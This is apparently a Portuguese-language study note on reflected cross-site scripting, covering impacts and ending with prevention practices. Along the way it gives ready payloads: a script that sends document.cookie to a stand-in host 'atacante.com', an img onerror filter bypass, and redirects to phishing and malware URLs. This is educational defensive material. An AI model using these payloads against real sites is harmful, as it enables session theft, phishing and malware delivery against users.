[[2 - LABS - XSS - Cross-site scripting (Reflected)]]

### **O que é?**

Reflected XSS ocorre quando **dados enviados pelo usuário** (como via URL, parâmetros GET ou POST) **são refletidos diretamente na página** sem validação ou sanitização. Isso permite a injeção e execução de **código malicioso no navegador da vítima**.

---

### **Impactos Possíveis**

- Roubo de **cookies** de sessão.
    
- Captura de dados digitados (**keylogger**).
    
- Redirecionamento para páginas de **phishing**.
    
- Download automático de **malwares**.
    
- Controle completo do navegador da vítima dentro do domínio da aplicação vulnerável.
    

---

### **Exemplo Básico de Injeção**

Se uma aplicação aceita um parâmetro `?nome=` na URL e o reflete diretamente em uma página HTML, podemos injetar um `script` assim:

```
http://vulneravel.com/?nome=<script>alert('XSS')</script>
```

Se o site não tratar corretamente esse input, o navegador da vítima **executa o alerta**, provando a execução de código.

---

### **Exemplo Realista (Coleta de Cookies)**

```html
<script>
  fetch('http://atacante.com/coletor?cookie=' + document.cookie);
</script>
```

Esse script, ao ser injetado, **envia os cookies da vítima para o atacante**, permitindo acesso à sessão da vítima caso o cookie não esteja com o atributo `HttpOnly`.

---

### **Alternativas à tag `<script>`**

Mesmo que o site bloqueie `<script>`, outras **tags HTML com atributos executáveis** podem ser usadas:

```html
<img src="x" onerror="alert('XSS via IMG')">
```

Nesse exemplo:

- A imagem falha ao carregar (`src="x"` inválido).
    
- O atributo `onerror` é executado automaticamente.
    

---

### **Redirecionamento para Phishing**

Você pode injetar um código que **automaticamente redireciona a vítima** para um site falso:

```html
<script>window.location='http://site-falso.com'</script>
```

Imagine isso aplicado em um site de banco ou e-commerce. O usuário clicaria em um link confiável, mas seria **direcionado para uma página de login falsa** (phishing).

---

### **Download de Malware (Simulação)**

```html
<a href="http://malware.com/virus.exe" download>Baixar Relatório</a>
```

Ou um redirecionamento forçado:

```html
<script>window.location.href='http://malware.com/virus.exe'</script>
```

---

### **Boas Práticas para Evitar XSS**

- **Escapar caracteres especiais**: `<`, `>`, `"`, `'`, `&`, `/`.
    
- **Sanitização** de entradas do usuário.
    
- Habilitar o atributo `HttpOnly` e `Secure` nos cookies.
    
- Utilizar **CSP (Content Security Policy)**.
    
- Evitar refletir dados diretamente no HTML.